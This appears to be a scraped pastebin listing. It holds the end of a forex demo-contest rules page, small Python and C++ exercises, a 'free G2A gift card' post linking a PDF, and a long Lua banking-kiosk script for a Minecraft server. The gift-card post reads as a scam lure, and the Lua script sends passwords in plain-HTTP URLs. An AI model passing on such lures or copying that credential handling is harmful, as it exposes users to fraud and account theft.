Trading Conditions

 	Initial Deposit: $10,000 for all participants.
 	Leverage: 1:500 by default.
 	Trading Instruments: Major currency pairs and cross rates are the only available trading instruments.
 	Trade Volume: Minimal trade volume is 0.01 lot, and the maximum is 1 lot.
 	Stop-out Level: 10%.
 	Expert Advisors: Participants can use Expert Advisors and any trading strategies without restrictions.

Determining Results and Winners

 	Results Access: Equity of participants' accounts is available in free access on the company's website during the contest period.
 	Winner Selection: The winners are determined based on the equity of their accounts at the end of the contest period.
 	Prize Claims: Winners are required to open and verify their live trading accounts to receive their prizes.

Additional Information

 	Future Registration: Participants can register for the next weekly contest during the week preceding it. Registration finishes one hour before the contest starts.
 	Disqualification Rights: The Organizer reserves the right to decline registration of any participant without explanation or disqualify any participant during the contest or after it is over with an explanation.

By following these rules and guidelines, participants can effectively take part in the Sniper Weekly Demo Contest and stand a chance to win cash prizes. This contest offers a fantastic opportunity for traders to refine their skills and gain recognition in the trading community.

Read InstaForex Review"
CECQcz2r,zad 2,Nihonik,Python,Sunday 2nd of June 2024 01:33:36 PM CDT,"x = int(input(""podaj liczbe: ""))


while True:
    if (x >= 0):
        x = int(input(""podaj ujemnƒÖ liczbe: ""))
    else:
        print(""ok"")
        break"
ss7hdbTF,Untitled,yasi04,Python,Sunday 2nd of June 2024 01:32:03 PM CDT,"def remove_none(data):
    new_data = []
    for i in range(len(data)):
        if data[i][0] is not None:
            new_data.append(data[i])
    return new_data


def remove_doubles_rows(data):
    new_data = []
    for i in data:
        new_data.append(i)
    for i in range(len(data) - 1):
        for j in range(i + 1, len(data)):
            if data[i] == data[j]:
                del new_data[j]
    return new_data


def remove_doubles_columns(data):
    for i in range(len(data)):
        data[i] = sorted(list(frozenset(data[i])))
    return data


def transport(data):
    for i in range(len(data)):
        data[i] = transport2(data[i])
    return data


def transport2(data):
    data[0] = ""("" + data[0].split(' ')[1] + "") "" + data[0].split(' ')[2]
    data[1] = f""{float(data[1]):.4f}""
    data[2] = data[2].split('[')[0]
    data[3] = data[3].split(' ')[0]
    return data


def transform(data):
    new_data = [[] for _ in range(len(data[0]))]
    for i in range(len(new_data)):
        for j in range(len(data)):
            new_data[i].append(data[j][i])
    new_data[0], new_data[1], new_data[2], new_data[3] = new_data[2], new_data[1], new_data[0], new_data[3]
    return new_data


def main(data):
    data = remove_none(data)
    data = remove_doubles_rows(data)
    data = remove_doubles_columns(data)
    data = transport(data)
    data = transform(data)
    return data
"
ZHXSbz10,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 01:29:12 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

int main()
{
  vector<pair<int, int>> v;

  int n;
  cin >> n;
  for(int i = 0; i < n; i++) {
    int a, b;
    cin >> a >> b;
    v.push_back(make_pair(b, a));
  }

  sort(v.begin(), v.end());
    int res = 1;
    int vreme = v[0].first;
    for(int i = 1; i < n; i++) {
        if(vreme <= v[i].second) {
            res++;
            vreme = v[i].first;
        }
    }
    cout << res << endl;


    return 0;
}
"
uR220kR1,zad 1,Nihonik,Python,Sunday 2nd of June 2024 01:27:31 PM CDT,"x = input(""podaj liczby odzielone spacjƒÖ: "")

y= x.split("" "")

z = 0

for i in y:
	a = int(i)
	if a % 10 == 0:
		z +=1
print(""ilo≈õƒá podanych liczb"" + len(x))
print(""ilo≈õƒá liczb podzielnych przez 10"" + z)"
H5Qz1Lde,ü§ëG2A.com Free Gift Card Guide June 2024 FixüéÅ,FeasModz514,JavaScript,Sunday 2nd of June 2024 01:18:01 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
7Th7ZVVN,Nebraska Pay Chiosco 1.19,lego11,Lua,Sunday 2nd of June 2024 01:04:50 PM CDT,"local maxw, maxh = term.getSize()

--IMPLEMENTAZIONE DEL DRAWFILLEDBOX
local function drawPixelInternal(xPos, yPos)
    term.setCursorPos(xPos, yPos)
    term.write("" "")
end

local tColourLookup = {}
for n = 1,16 do
    tColourLookup[string.byte(""0123456789abcdef"", n, n)] = 2^(n-1)
end

function drawFilledBox(startX, startY, endX, endY, nColour)
    if type(startX) ~= ""number"" or type(startX) ~= ""number"" or
       type(endX) ~= ""number"" or type(endY) ~= ""number"" or
       (nColour ~= nil and type(nColour) ~= ""number"") then
        error(""Expected startX, startY, endX, endY, colour"", 2)
    end

    startX = math.floor(startX)
    startY = math.floor(startY)
    endX = math.floor(endX)
    endY = math.floor(endY)

    if nColour then
        term.setBackgroundColor(nColour)
    end
    if startX == endX and startY == endY then
        drawPixelInternal(startX, startY)
        return
    end

    local minX = math.min(startX, endX)
    if minX == startX then
        minY = startY
        maxX = endX
        maxY = endY
    else
        minY = endY
        maxX = startX
        maxY = startY
    end

    for x = minX, maxX do
        for y = minY, maxY do
            drawPixelInternal(x, y)
        end
    end
end

function clear()
    sfondo(colors.lightBlue)
    term.clear()
    term.setCursorPos(1, 1)
end
 
function colore(sfumatura)
    term.setTextColour(sfumatura)
end

function sfondo(sfumaturaSfondo)
    term.setBackgroundColour(sfumaturaSfondo)
end

function titolo(testo)
    drawFilledBox(1, 1, maxw, 1, colors.yellow)
    term.setCursorPos((maxw - #testo) / 2, 1)
    colore(colors.black)
    term.write(testo)
    sfondo(colors.lightBlue)
end

function update()
    term.setCursorPos(1, 21)
    shell.run(""pastebin get y1AP0iNY startup2"") -- Inserire paste di nPay
	if fs.exists(""startup2"") then
		shell.run(""rm startup"")
		shell.run(""mv startup2 startup"")
    end
    os.reboot()
end

function disconnetti()
    clear()
    text = ""ARRIVEDERCI!""
    colore(colors.white)
    term.setCursorPos((maxw - #text) / 2, math.floor(maxh / 2))
    term.write(text)
    colore(colors.black)
    text2 = ""Tra poco sar√•A0 possibile eseguire""
    text3 = ""una nuova operazione...""
    term.setCursorPos((maxw - #text2) / 2, math.floor(maxh / 2) + 2)
    print(text2)
    term.setCursorPos((maxw - #text3) / 2, math.floor(maxh / 2) + 3)
    print(text3)
    os.sleep(0.5)
    update()
end

function drawCard()
    drawFilledBox(6, 7, 24, 7, colors.blue)
    drawFilledBox(6, 15, 24, 15, colors.blue)
    drawFilledBox(5, 8, 25, 14, colors.blue)

    drawFilledBox(7, 9, 23, 9, colors.lightGray)
    drawFilledBox(7, 12, 23, 13, colors.black)
end

mag = peripheral.wrap(""bottom"")
bl = ""BN Credit""

sfondo(colors.lightBlue)
clear()

colore(colors.white)
print("" "")
print(""                      ___            "")
print(""              _ __   / _ \\__ _ _   _ "")
print(""             | '_ \\ / /_)/ _  | | | |"")
print(""             | | | / ___/ (_| | |_| |"")
print(""             |_| |_\\/    \\__,_|\\__, |"")
print(""                                |___/ "")

-- Bottoni login/registrati

drawFilledBox(14, 10, 38, 12, colors.white)
term.setCursorPos(23, 11)
colore(colors.black)
term.write(""Accedi"")

drawFilledBox(14, 15, 38, 17, colors.white)
term.setCursorPos(21, 16)
colore(colors.black)
term.write(""Sei nuovo?"")

while true do
    event, key, x, y = os.pullEvent(""mouse_click"")
    if event == ""mouse_click"" and x >= 14 and x <= 38 and y >= 15 and y <= 17 then
        -- Registrazione nuovo utente
        clear()
        titolo(""Registrati a nPay"")
        term.setCursorPos(1, 3)
        print(""Inserisci un nome utente e una password sicura."")
        term.setCursorPos(1, 5)
        colore(colors.gray)
        print(""Premi ENTER per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventer√•A0 verde.\nSe sono errati, il programma chieder√•A0 di reinserirli nuovamente."")

        -- Nome Utente
        term.setCursorPos(1, 10)
        colore(colors.black)
        term.write(""Nome utente:"")
        term.setCursorPos(14, 10)
        colore(colors.white)
        utenteAccettato = false
        conteggioErrori = 0
        while utenteAccettato == false do
            utente = read()
			utente = string.gsub(utente, ""%s"", """")
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. utente).readAll()
            tabcheckuser = textutils.unserialize(checkuser)
            if tabcheckuser.stato == ""NO"" then
                term.setCursorPos(14, 10)
                colore(colors.lime)
                term.write(utente)
                colore(colors.white)
                utenteAccettato = true
            else
                term.setCursorPos(14, 10)
                colore(colors.red)
                term.write(""Utente gi√•A0 esistente!"")
                sleep(2)
                term.setCursorPos(14, 10)
                colore(colors.white)
                term.write(""                       "")
                term.setCursorPos(14, 10)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(14, 10)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(14, 10)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(14, 10)
                    clear()
                    os.reboot()
                end
            end
        end

        --password
        colore(colors.black)
        term.setCursorPos(1, 12)
        term.write(""Password:"")
        term.setCursorPos(11, 12)
        colore(colors.white)

        passAccettata = false
        conteggioErrori = 0
        while passAccettata == false do
            password1 = read(""#"")
            colore(colors.black)
            term.setCursorPos(1, 13)
            term.write(""Verifica:"")
            term.setCursorPos(11, 13)
            colore(colors.white)
            local password2 = read(""#"")
            if password1 == password2 then
                term.setCursorPos(11, 12)
                colore(colors.lime)
                term.write(""###############"")
                term.setCursorPos(11, 13)
                term.write(""###############"")
                colore(colors.white)
                passAccettata = true
            else
                colore(colors.red)
                term.setCursorPos(11, 12)
                term.write(""Le password non corrispondono!    "")
                term.setCursorPos(1, 13)
                colore(colors.white)
                term.write(""                               "")
                sleep(1.5)
                term.setCursorPos(11, 12)
                term.write(""                               "")
                term.setCursorPos(11, 12)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(14, 12)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(1.5)
                    term.setCursorPos(14, 12)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(14, 12)
                    clear()
                    os.reboot()
                end
            end
        end

        --crea l'account

        term.setCursorPos(1, 17)
        creaAccount = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password1 .. ""&utente="" .. utente .. ""&richiesta=crea&valore=0"").readAll()
        tabCreaAccount = textutils.unserialize(creaAccount)
        if tabCreaAccount.stato == ""OA"" then
            colore(colors.lime)
            print(""Conto creato con successo."")
            sleep(1.5)
            clear()
            os.reboot()
        else
            colore(colors.red)
            print(""Errore durante la creazione del conto."")
            sleep(1.5)
            clear()
            os.reboot()
        end

    elseif event == ""mouse_click"" and x >= 14 and x <= 38 and y >= 10 and y <= 12 then
        clear()
        titolo(""Accedi a nPay"")
        term.setCursorPos(1, 3)
        colore(colors.black)
        print(""Inserire i propri dati."")
        colore(colors.gray)
        print(""\nPremere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventer√•A0 verde.\nSe sono errati, il programma chieder√•A0 di reinserirli nuovamente."")

        --nomeutente
        term.setCursorPos(1, 10)
        colore(colors.black)
        term.write(""Nome utente:"")
        term.setCursorPos(15, 10)
        colore(colors.white)
        utenteAccettato = false
        conteggioErrori = 0
        while utenteAccettato == false do
            utente = read()
            utente = string.gsub(utente, ""%s"", """")
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. utente).readAll()
            tabcheckuser = textutils.unserialize(checkuser)
            if tabcheckuser.stato == ""OK"" then
                term.setCursorPos(15, 10)
                colore(colors.lime)
                term.write(utente)
                colore(colors.white)
                utenteAccettato = true
            else
                term.setCursorPos(15, 10)
                colore(colors.red)
                term.write(""Utente errato!          "")
                sleep(2)
                term.setCursorPos(15, 10)
                colore(colors.white)
                term.write(""                       "")
                term.setCursorPos(15, 10)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(15, 10)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(15, 10)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(15, 10)
                    clear()
                    os.reboot()
                end
            end
        end

        --password
        colore(colors.black)
        term.setCursorPos(1,12)
        term.write(""Password:"")
        term.setCursorPos(15, 12)
         
        conteggioErrori = 0
        passAccettata = false
        while passAccettata == false do
            colore(colors.white)
            password = read(""#"")
            password = string.gsub(password, ""%s"", """")
            colore(colors.black)
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password .. ""&richiesta=addebito&valore=0&utente="".. utente).readAll()
            risposta = textutils.unserialize(checkuser)
            if risposta.stato == ""OK"" then
                term.setCursorPos(15, 12)
                colore(colors.lime)
                term.write(""##############               "")
                colore(colors.white)
                passAccettata = true
                else
                    term.setCursorPos(15, 12)
                    colore(colors.red)
                    term.write(""Password errata!            "")
                    conteggioErrori = conteggioErrori + 1
                    sleep(2)
                    term.setCursorPos(15, 12)
                    term.write(""                               "")
                    term.setCursorPos(15, 12)
                if conteggioErrori > 2 then
                    term.setCursorPos(15, 12)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(15, 12)
                    term.write(""                               "")
                    term.setCursorPos(15, 12)
                    clear()
                    os.reboot()
                end
            end
        end

        conteggioErrori = 0
        -- Pagina in cui scegli le operazioni da fare

        while true do
            --Ricontrolla il saldo per gestire l'aggiornamento di pi√•B9 operazioni
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=""..password..""&richiesta=addebito&valore=0&utente=""..utente).readAll()
            risposta = textutils.unserialize(checkuser)
            saldo = tonumber(risposta.saldo)
            --Disegna la finestra del pannello utente
            clear()
            titolo(""Pannello utente nPay"")
            term.setCursorPos(1, 3)
            term.write(""Benvenuto, "")
            colore(colors.white)
            term.write(utente)
            colore(colors.black)
            term.write(""!         Saldo: "")
            colore(colors.white)
            term.write(saldo)
            colore(colors.black)
            term.write("" IC"")
            print(""\n\nOperazioni disponibili:\n"")
            sfondo(colors.white)
            print("" Carica denaro su nPay  \n"")
            print("" Preleva denaro da nPay \n"")
            print("" Trasferisci denaro     \n"")
            print("" Estratto conto         \n"")
            colore(colors.red)
            print("" Disconnettiti da nPay  \n"")
            colore(colors.black)

            antitonto = os.startTimer(60)

            event, key, x, y = os.pullEventRaw()
            if event == ""mouse_click"" and y == 7 and x <= 24 then       --Pulsante carica denaro su nPay
                clear()
                titolo(""Caricamento denaro su nPay"")

                drawCard()

                sfondo(colors.lightBlue)
                colore(colors.black)
                term.setCursorPos(30, 8)
                print(""INSERIRE LA CARTA"")
                term.setCursorPos(29, 10)
                print(""NEL LETTORE IN BASSO"")
                drawFilledBox(34, 14, 42, 14, colors.white)
                term.setCursorPos(35, 14)
                term.write(""Annulla"")

                mag.setInsertCardLight(true)
                finalBreakC = false
                while true do
                    event, arg1, arg2, arg3 = os.pullEventRaw()
                    if event == ""mouse_click"" and arg3 == 14 and arg2 >= 34 and arg2 <= 42 then -- arg2 = x | arg3 = y
                        mag.setInsertCardLight(false)
                        clear()
                        term.setCursorPos(1,1)
                        break
                    elseif event == ""mag_swipe"" then
                        mag.setInsertCardLight(false)
                        tabel = textutils.unserialize(arg1)
                        if tabel == """" or tabel == nil then
                            clear()
                            titolo(""Caricamento denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(30, 12)
                            colore(colors.black)
                            term.write(""Carta smagnetizzata!"")
                            os.sleep(3)
                            break
                        elseif tabel.t ~= ""cc"" or tabel.e ~= ""BN"" then
                            clear()
                            titolo(""Caricamento denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(31, 12)
                            colore(colors.black)
                            term.write(""Carta non valida!"")
                            os.sleep(3)
                            break
                        else
                            while true do
                                clear()
                                titolo(""Caricamento denaro su nPay"")
                                colore(colors.gray)
                                print(""\n\nDisponibilit√•A0 su carta:  "" .. tabel.v .. "" IC"")
                                colore(colors.red)
                                term.setCursorPos(1, 14)
                                term.write(""ATTENZIONE:"")
                                colore(colors.black)
                                term.setCursorPos(1, 15)
                                term.write(""Eccezionalmente, grazie ai 600 voti di marzo,"")
								--term.write(""Per le operazioni inferiori a 50 000 IC,"")
                                term.setCursorPos(1, 16)
								print(""le operazioni saranno GRATUITE fino al 4 aprile!"")
                                --print(""si applica una commissione del 0.15%."")
                                --print(""Oltre 50 000 IC la commissione √•A8 del 0.05%."")
                                term.setCursorPos(1, 5)
                                term.write(""Importo da caricare: "")
                                colore(colors.white)
                                credito = tonumber(tabel.v)
                                credit = read()
                                if tonumber(credit) == """" or tonumber(credit) == nil or tonumber(credit) <= 0 then
                                    colore(colors.red)
                                    term.setCursorPos(22, 5)
                                    term.write(""Importo errato!                    "")
                                    colore(colors.black)
                                    sleep(1.5)
                                    clear()
                                else
                                    if tonumber(credit) >= 50000 then
										--commissioni = tonumber(credit) * 0.005
										commissioni = tonumber(credit) * 0
                                    else
                                       --commissioni = tonumber(credit) * 0.015
									   commissioni = tonumber(credit) * 0
                                    end
									crediton = credit + commissioni
                                    if tonumber(tabel.v) >= crediton then
                                        tab = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=accredito&valore="" .. credit).readAll()
                                        tabella = textutils.unserialize(tab)
                                        tabr = {}
                                        tabr.t = tabel.t
                                        tabr.e = tabel.e
                                        tabr.p = tabel.p
                                        tabr.v = tonumber(tabel.v) - crediton
                                        ncr = textutils.serialize(tabr)
                                        clear()
                                        titolo(""Caricamento denaro su nPay"")

                                        drawCard()

                                        colore(colors.black)
                                        sfondo(colors.lightBlue)
                                        term.setCursorPos(29, 10)
                                        print(""RE-INSERIRE LA CARTA"")
                                        term.setCursorPos(29, 12)
                                        print(""NEL LETTORE IN BASSO"")

                                        mag.setInsertCardLight(true)
                                        mag.beginWrite(ncr, bl)
                                        za2, carta = os.pullEvent(""mag_write_done"")
                                        mag.setInsertCardLight(false)
                                        clear()
                                        titolo(""Caricamento denaro su nPay"")

                                        colore(colors.lime)
                                        term.setCursorPos(1, 3)
                                        print(""Operazione completata!"")
                                        colore(colors.black)
                                        term.setCursorPos(1, 5)
                                        print(""Denaro accreditato: "" .. credit .. "" IC"")
                                        print(""Commissioni:        "" .. commissioni .. "" IC"")
                                        term.setCursorPos(1, 8)
                                        print(""Saldo sul conto:    "" .. tabella.credito .. "" IC"")
                                        print(""Saldo sulla carta:  "" .. tabr.v .. "" IC"")
                                        sfondo(colors.white)
                                        term.setCursorPos(1, 12)
                                        term.write("" Torna alla pagina principale "")
                                        sfondo(colors.lightBlue)

                                        antiTonto2 = os.startTimer(15)
                                        while true do
                                            local event, arg1, arg2, arg3 = os.pullEventRaw()
                                            if event == ""mouse_click"" and arg3 == 12 and arg2 <= 30 or event == ""timer"" and arg1 == antiTonto2 then -- arg2 = x | arg3 = y
                                                finalBreakC = true
                                                break
                                            end
                                        end
                                        break
                                    else
                                        colore(colors.red)
                                        term.setCursorPos(22, 5)
                                        term.write(""Credito su carta insufficente."")
                                        colore(colors.black)
                                        sleep(1.5)
                                        clear()
                                    end
                                end
                            end
                            if finalBreakC then
                                break
                            end
                        end
                    end
                end

            elseif event == ""mouse_click"" and y == 9 and x <= 24 then  --Pulsante preleva denaro da nPay
                clear()
                titolo(""Prelievo denaro da nPay"")

                drawCard()

                sfondo(colors.lightBlue)
                colore(colors.black)
                term.setCursorPos(30, 8)
                print(""INSERIRE LA CARTA"")
                term.setCursorPos(29, 10)
                print(""NEL LETTORE IN BASSO"")
                drawFilledBox(34, 14, 42, 14, colors.white)
                term.setCursorPos(35, 14)
                term.write(""Annulla"")

                mag.setInsertCardLight(true)
                finalBreakP = false
                while true do
                    event, arg1, arg2, arg3 = os.pullEventRaw()
                    if event == ""mouse_click"" and arg3 == 14 and arg2 >= 34 and arg2 <= 42 then -- arg2 = x | arg3 = y
                        mag.setInsertCardLight(false)
                        clear()
                        term.setCursorPos(1,1)
                        break
                    elseif event == ""mag_swipe"" then
                        mag.setInsertCardLight(false)
                        sfondo(colors.lightBlue)
                        clear()
                        tabel = textutils.unserialize(arg1)
                        if tabel == """" or tabel == nil then
                            clear()
                            titolo(""Prelievo denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(30, 12)
                            colore(colors.black)
                            term.write(""Carta smagnetizzata!"")
                            os.sleep(3)
                            break
                        elseif tabel.t ~= ""cc"" or tabel.e ~= ""BN"" then
                            clear()
                            titolo(""Prelievo denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(31, 12)
                            colore(colors.black)
                            term.write(""Carta non valida!"")
                            os.sleep(3)
                            break
                        else
                            while true do
                                tabr = {}
                                tabr.e = tabel.e
                                tabr.p = tabel.p
                                tabr.t = tabel.t
                                tab1 = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=accredito&valore=0"").readAll()
                                tab3 = textutils.unserialize(tab1)
                                clear()
                                titolo(""Prelievo denaro da nPay"")
                                colore(colors.gray)
                                print(""\n\nDisponibilit√•A0 su conto:  "" .. saldo .. "" IC"")
                                colore(colors.black)
                                term.setCursorPos(1, 5)
                                term.write(""Importo da ritirare: "")
                                colore(colors.white)
                                credito = tonumber(tabel.v)
                                credit = read()
                                if tonumber(credit) == """" or tonumber(credit) == nil or tonumber(credit) <= 0 then
                                    colore(colors.red)
                                    term.setCursorPos(22, 5)
                                    term.write(""Importo errato!                    "")
                                    colore(colors.black)
                                    sleep(1.5)
                                    clear()
                                else
                                    tab = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=addebito&valore="" .. credit).readAll()
                                    tabella = textutils.unserialize(tab)
                                    if tabella.stato == ""DI"" then
                                        colore(colors.red)
                                        term.setCursorPos(22, 5)
                                        term.write(""Credito su carta insufficente."")
                                        colore(colors.black)
                                        sleep(1.5)
                                        clear()
                                    else
                                        tabr.v = tonumber(tabel.v) + tonumber(credit)
                                        ncr = textutils.serialize(tabr)
                                        mag.setInsertCardLight(true)
                                        mag.beginWrite(ncr, bl)
                                        clear()
                                        titolo(""Prelievo denaro da nPay"")

                                        drawCard()

                                        colore(colors.black)
                                        sfondo(colors.lightBlue)
                                        term.setCursorPos(29, 10)
                                        print(""RE-INSERIRE LA CARTA"")
                                        term.setCursorPos(29, 12)
                                        print(""NEL LETTORE IN BASSO"")

                                        mag.setInsertCardLight(true)
                                        event = os.pullEvent(""mag_write_done"")
                                        mag.setInsertCardLight(false)
                                        clear()
                                        titolo(""Prelievo denaro da nPay"")

                                        colore(colors.lime)
                                        term.setCursorPos(1, 3)
                                        print(""Operazione completata!"")
                                        colore(colors.black)
                                        term.setCursorPos(1, 5)
                                        print(""Denaro prelevato:  "" .. credit .. "" IC"")
                                        term.setCursorPos(1, 7)
                                        print(""Saldo sul conto:   "" .. tabella.credito .. "" IC"")
                                        print(""Saldo sulla carta: "" .. tabr.v .. "" IC"")
                                        sfondo(colors.white)
                                        term.setCursorPos(1, 11)
                                        term.write("" Torna alla pagina principale "")
                                        sfondo(colors.lightBlue)

                                        antiTonto2 = os.startTimer(15)
                                        while true do
                                            local event, arg1, arg2, arg3 = os.pullEventRaw()
                                            if event == ""mouse_click"" and arg3 == 11 and arg2 <= 30 or event == ""timer"" and arg1 == antiTonto2 then -- arg2 = x | arg3 = y
                                                finalBreakP = true
                                                break
                                            end
                                        end
                                        break
                                    end
                                end
                            end
                            if finalBreakP then
                                break
                            end
                        end
                    end
                end

            elseif event == ""mouse_click"" and y == 11 and x <= 24 then --Pulsante trasferisci denaro
                --Trasferisci denaro
                --inizio pagina
                clear()
                titolo(""Trasferimento di denaro"")
                term.setCursorPos(1, 3)
                term.write(""Inserire il nome utente del beneficiario."")
                colore(colors.gray)
                print(""\n\nPremere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventer√•A0 verde.\nSe sono errati, il programma chieder√•A0 di reinserirli nuovamente."")

                --Mostra saldo
                term.setCursorPos(1, 10)
                colore(colors.gray)
                print(""Saldo disponibile: "" .. saldo .. "" IC"")
                colore(colors.black)

                --Verifica Beneficiario
                term.setCursorPos(1, 12)
                term.write(""Beneficiario:"")
                term.setCursorPos(15, 12)
                colore(colors.white)
                destAccettato = false
                conteggioErrori = 0
                while destAccettato == false do
                    beneficiario = read()
                    checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. beneficiario).readAll()
                    tabcheckuser = textutils.unserialize(checkuser)
                    if tabcheckuser.stato == ""OK"" and beneficiario ~= utente then
                        term.setCursorPos(15, 12)
                        colore(colors.lime)
                        term.write(beneficiario)
                        colore(colors.white)
                        destAccettato = true
                    else
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 12)
                        colore(colors.red)
                        if beneficiario == utente then
                            term.write(""Non puoi inserire te stesso."")
                        else
                            term.write(""Utente inesistente!         "")
                        end
                        sleep(2)
                        term.setCursorPos(15, 12)
                        colore(colors.white)
                        term.write(""                                      "")
                        term.setCursorPos(15, 12)
                        if conteggioErrori > 2 then
                            term.setCursorPos(15, 12)
                            colore(colors.red)
                            term.write(""Tre tentativi di immissione errati."")
                            sleep(2)
                            term.setCursorPos(15, 12)
                            colore(colors.white)
                            term.write(""                                   "")
                            term.setCursorPos(15, 12)
                            clear()
                            os.reboot()
                        end
                    end
                end

                colore(colors.black)
                --Verifica valore dell'invio
                term.setCursorPos(1, 14)
                term.write(""Importo:"")
                term.setCursorPos(15, 14)
                colore(colors.white)
                importoAccettato = false
                conteggioErrori = 0
                while importoAccettato == false do
                    importo = tonumber(read())
                    if importo == """" or importo == nil or importo <= 0 then
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 14)
                        colore(colors.red)
                        term.write(""Importo errato!                    "")
                        sleep(2)
                        term.setCursorPos(15, 14)
                        colore(colors.white)
                        term.write(""                                   "")
                        term.setCursorPos(15, 14)
                    elseif importo <= saldo and importo > 0 then
                        term.setCursorPos(15, 14)
                        colore(colors.lime)
                        term.write(importo .. "" IC"")
                        colore(colors.white)
                        importoAccettato = true
                    else
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 14)
                        colore(colors.red)
                        term.write(""Credito insufficiente!          "")
                        sleep(2)
                        term.setCursorPos(15, 14)
                        colore(colors.white)
                        term.write(""                                   "")
                        term.setCursorPos(15, 14)
                        if conteggioErrori > 2 then
                            term.setCursorPos(15, 14)
                            colore(colors.red)
                            term.write(""Tre tentativi di immissione errati."")
                            sleep(2)
                            term.setCursorPos(15, 14)
                            colore(colors.white)
                            term.write(""                                   "")
                            term.setCursorPos(15, 14)
                            clear()
                            os.reboot()
                        end
                    end
                end

                sleep(0.5)
                clear()
                titolo(""Riepilogo del trasferimento"")

                text = ""Vuoi inviare "" .. importo .. "" IC a "" .. beneficiario .. ""?""
                term.setCursorPos((maxw - #text) / 2, 6)
                term.write(""Vuoi inviare "")
                colore(colors.white)
                term.write(tostring(importo) .. "" IC "")
                colore(colors.black)
                term.write(""a "")
                colore(colors.white)
                term.write(beneficiario)
                colore(colors.black)
                term.write(""?"")

                drawFilledBox(7, 11, 23, 13, colors.white)
                drawFilledBox(29, 11, 45, 13, colors.white)

                term.setCursorPos(8, 12)
                colore(colors.lime)
                term.write(""Invia il denaro"")

                term.setCursorPos(34, 12)
                colore(colors.red)
                term.write(""Annulla"")

                inviare = false
                while true do
                    event, key, x, y = os.pullEvent()
                    if event == ""mouse_click"" and x >= 7 and x <= 23 and y >= 11 and y <= 13 then
                        inviaDenaro = http.get(""http://luanet.rgbcraft.com/luanet/servlets/nebraskapay.php?auth="" .. password .. ""&utente="" .. utente .. ""&richiesta=trasferimento&valore="" .. importo .. ""&beneficiario="" .. beneficiario).readAll()
                        risultatoInvio = textutils.unserialize(inviaDenaro)
                        if risultatoInvio.stato == ""OK"" then
                            text = ""Invio del denaro riuscito.""
                            text2 = ""Nuovo saldo: "" .. risultatoInvio.credito .. "" IC""
                            sfondo(colors.lightBlue)
                            colore(colors.lime)
                            term.setCursorPos((maxw - #text) / 2, 16)
                            term.write(text)
                            colore(colors.black)
                            term.setCursorPos((maxw - #text2) / 2, 18)
                            term.write(text2)
                            sleep(2)
                            clear()
                            break
                        else
                            text = ""Errore durante l'invio del denaro.""
                            text2 = risultatoInvio.errore
                            sfondo(colors.lightBlue)
                            colore(colors.red)
                            term.setCursorPos((maxw - #text) / 2, 16)
                            term.write(text)
                            colore(colors.black)
                            term.setCursorPos((maxw - #text2) / 2, 18)
                            term.write(text2)
                            sleep(2)
                            clear()
                            break
                        end
                    elseif event == ""mouse_click"" and x >= 29 and x <= 45 and y >= 11 and y <= 13 then
                        sfondo(colors.lightBlue)
                        colore(colors.red)
                        text = ""Operazione annullata.""
                        term.setCursorPos((maxw - #text) / 2, 16)
                        term.write(text)
                        sleep(1.5)
                        clear()
                        break
                    end
                end

            elseif event == ""mouse_click"" and y == 13 and x <= 24 then --Pulsante estratto conto
                --Estratto Conto (inizio pagina)
                clear()
                titolo(""Estratto conto"")

                estratto = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password .. ""&utente="" .. utente .. ""&richiesta=estratto"").readAll()
